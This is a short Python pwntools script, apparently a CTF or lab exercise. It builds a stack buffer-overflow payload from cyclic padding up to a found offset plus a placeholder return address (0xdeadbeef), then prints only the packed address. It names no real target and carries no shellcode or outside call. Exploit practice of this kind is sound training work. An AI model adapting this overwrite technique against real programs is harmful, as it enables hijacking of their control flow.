#!/usr/bin/python3

from pwn import *

padding = cyclic(cyclic_find('jaaa'))

# info('The Padding is ' + padding)

eip = p32(0xdeadbeef)

payload =  padding + eip

print(eip)